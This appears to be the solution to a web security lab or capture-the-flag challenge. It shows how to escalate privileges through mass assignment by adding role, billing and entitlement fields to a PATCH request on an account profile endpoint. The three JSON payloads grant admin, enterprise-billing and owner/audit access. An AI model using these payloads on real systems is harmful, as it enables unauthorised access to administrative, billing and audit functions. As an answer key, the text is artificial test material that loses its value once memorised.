# Solution

Intercept `PATCH /api/v1/account/profile` and add sensitive fields to the JSON body.

Admin console:

```json
{"workspace":{"role":"admin"},"entitlements":{"admin_console":true}}
```

Billing export:

```json
{"billing":{"plan":"enterprise","invoice_export_enabled":true},"entitlements":{"advanced_export":true}}
```

Audit log:

```json
{"workspace":{"role":"owner"},"entitlements":{"audit_log":true}}
```

After each request, open `/admin`, `/billing` or `/audit` to confirm the impact.
